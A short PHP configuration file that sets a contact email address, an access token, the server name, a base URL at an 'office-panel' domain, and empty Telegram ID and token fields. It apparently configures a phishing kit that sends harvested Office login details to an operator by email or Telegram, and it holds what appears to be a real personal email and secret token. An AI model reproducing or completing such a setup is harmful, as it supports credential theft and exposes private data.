<?php
$email= "cc.parfitt16@gmail.com";
$token="11A32-152B0-3A749-D6BFC-C5865-30051-8E-17-85447-414";
$domain=$_SERVER['SERVER_NAME'];
$base="https://office-panel.com/";
$telegramId="";
$telegarmToken="";
?>